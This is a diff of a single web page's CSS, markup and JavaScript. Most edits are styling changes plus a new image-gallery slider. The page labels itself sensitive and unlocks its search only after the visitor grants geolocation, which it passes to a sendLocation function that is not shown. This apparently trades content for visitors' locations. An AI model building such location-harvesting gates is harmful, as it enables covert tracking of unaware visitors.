@@ -16,21 +16,23 @@ body {
   align-items: center;
 }
 
-h1 { margin-top: 40px; }
+h1 {
+  margin-top: 40px;
+}
 
 .main-img {
   margin-top: 20px;
-  width: 150px;
-  height: 150px;
+  width: 130px;
+  height: 130px;
   border-radius: 18px;
   object-fit: cover;
 }
 
-.control {
+.controls {
+  margin-top: 20px;
   display: flex;
   align-items: center;
   gap: 10px;
-  margin-top: 20px;
 }
 
 input {
@@ -41,7 +43,7 @@ input {
 }
 
 button {
-  padding: 10px 20px;
+  padding: 10px 22px;
   border-radius: 10px;
   border: none;
   font-weight: bold;
@@ -50,7 +52,7 @@ button {
 
 button.disabled {
   background: #555;
-  color: #999;
+  color: #aaa;
   cursor: not-allowed;
 }
 
@@ -59,34 +61,33 @@ button.active {
   color: black;
 }
 
-/* Toggle */
 .toggle {
-  width: 50px;
-  height: 26px;
-  background: #555;
-  border-radius: 20px;
+  width: 46px;
+  height: 24px;
+  background: #444;
+  border-radius: 12px;
   position: relative;
   cursor: pointer;
 }
 
 .toggle::after {
   content: "";
-  width: 22px;
-  height: 22px;
+  position: absolute;
+  width: 20px;
+  height: 20px;
   background: white;
   border-radius: 50%;
-  position: absolute;
   top: 2px;
   left: 2px;
-  transition: 0.3s;
+  transition: 0.2s;
 }
 
 .toggle.on {
-  background: #0f0;
+  background: #1aff6c;
 }
 
 .toggle.on::after {
-  left: 26px;
+  left: 24px;
 }
 
 .warning {
@@ -94,7 +95,7 @@ button.active {
   opacity: 0.6;
 }
 
-/* Modal */
+/* MODAL */
 .modal {
   display: none;
   position: fixed;
@@ -107,12 +108,13 @@ button.active {
 }
 
 .modal-box {
+  position: relative;
   width: 320px;
   text-align: center;
-  position: relative;
 }
 
-.modal img, .modal video {
+.modal video,
+.modal img {
   width: 100%;
   border-radius: 16px;
 }
@@ -125,7 +127,23 @@ button.active {
   cursor: pointer;
 }
 
-/* Phone button */
+/* panah geser */
+.nav-btn {
+  position: absolute;
+  bottom: -45px;
+  font-size: 26px;
+  color: white;
+  background: rgba(0,0,0,0.4);
+  border: none;
+  border-radius: 6px;
+  padding: 4px 12px;
+  cursor: pointer;
+}
+
+.nav-left { left: 0; }
+.nav-right { right: 0; }
+
+/* tombol telepon */
 .phone-btn {
   position: fixed;
   bottom: 20px;
@@ -137,11 +155,12 @@ button.active {
   display: flex;
   justify-content: center;
   align-items: center;
+  z-index: 1000;
 }
 
 .phone-btn svg {
-  width: 28px;
-  height: 28px;
+  width: 26px;
+  height: 26px;
   fill: black;
 }
 </style>
@@ -153,21 +172,23 @@ button.active {
 
 <img class="main-img" src="https://files.catbox.moe/2sgujb.jpg">
 
-<div class="control">
+<div class="controls">
   <input id="keyword" placeholder="Search" disabled>
   <button id="searchBtn" class="disabled">SEARCH</button>
-  <div id="toggle" class="toggle"></div>
+  <div class="toggle" id="toggle"></div>
 </div>
 
-<div class="warning">This Web Is Sensitive ⚠</div>
+<div class="warning">This Web Is Sensitif⚠</div>
 
+<!-- MODAL -->
 <div class="modal" id="modal">
   <div class="modal-box" id="modalBox">
     <div class="close" onclick="closeModal()">✕</div>
   </div>
 </div>
 
-<a href="https://wa.me/6281317309919" target="_blank" class="phone-btn">
+<!-- Telepon -->
+<a class="phone-btn" href="https://wa.me/6281317309919" target="_blank">
 <svg viewBox="0 0 24 24">
 <path d="M6.62 10.79a15.05 15.05 0 006.59 6.59l2.2-2.2a1 1 0 011.11-.21c1.2.48 2.5.74 3.83.74a1 1 0 011 1v3.5a1 1 0 01-1 1C10.07 21.5 2.5 13.93 2.5 4a1 1 0 011-1H7a1 1 0 011 1c0 1.33.26 2.63.74 3.83a1 1 0 01-.21 1.11l-2.2 2.2z"/>
 </svg>
@@ -176,6 +197,8 @@ button.active {
 <script>
 let data = {};
 let locationEnabled = false;
+let currentImages = [];
+let currentIndex = 0;
 
 fetch("https://lipzz-elzxd.github.io/Lipz/data.json")
   .then(r => r.json())
@@ -199,7 +222,6 @@ toggle.onclick = () => {
     toggle.classList.add("on");
     searchBtn.className = "active";
     keyword.disabled = false;
-
     sendLocation(pos);
   }, () => {
     alert("Izin lokasi ditolak");
@@ -221,17 +243,45 @@ searchBtn.onclick = () => {
     v.controls = true;
     v.autoplay = true;
     box.appendChild(v);
-  } else {
+  }
+
+  if (data[key].type === "gallery") {
+    currentImages = data[key].images;
+    currentIndex = 0;
+
     const img = document.createElement("img");
-    img.src = data[key].images[0];
+    img.id = "galleryImg";
+    img.src = currentImages[currentIndex];
     box.appendChild(img);
+
+    const left = document.createElement("button");
+    left.className = "nav-btn nav-left";
+    left.innerText = "<";
+    left.onclick = () => slide(-1);
+
+    const right = document.createElement("button");
+    right.className = "nav-btn nav-right";
+    right.innerText = ">";
+    right.onclick = () => slide(1);
+
+    box.appendChild(left);
+    box.appendChild(right);
   }
 
   document.getElementById("modal").style.display = "flex";
 };
 
+function slide(dir) {
+  currentIndex += dir;
+  if (currentIndex < 0) currentIndex = currentImages.length - 1;
+  if (currentIndex >= currentImages.length) currentIndex = 0;
+  document.getElementById("galleryImg").src = currentImages[currentIndex];
+}
+
 function closeModal() {
   document.getElementById("modal").style.display = "none";
+  document.getElementById("modalBox").innerHTML =
+    '<div class="close" onclick="closeModal()">✕</div>';
 }
 
 function fix(n) {
